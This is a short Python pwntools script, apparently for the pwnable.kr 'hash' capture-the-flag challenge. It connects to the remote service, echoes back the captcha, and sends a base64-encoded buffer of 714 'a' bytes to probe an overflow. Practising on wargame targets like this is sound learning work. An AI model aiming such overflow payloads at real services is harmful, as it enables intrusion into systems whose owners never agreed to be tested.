from pwn import *
import base64

# Connection details
host = 'pwnable.kr'
# # host = 'localhost'
port = 9002

# context.log_level = 'debug'

# # Establish a remote connection
p = remote(host, port)
# p = process('./hash')

p.recvuntil(b'input captcha : ') # get all begin data

captcha = int(p.recv().decode().strip())
log.info('captcha is ' + str(captcha))
p.sendline(str(captcha))

p.recvuntil('paste me!\n')

payload = b'a' * 714
encoded_payload = base64.b64encode(payload)
log.info(b'payload is ' + encoded_payload)
p.sendline(encoded_payload)

print(p.recv().decode())

# p.interactive()

p.close()
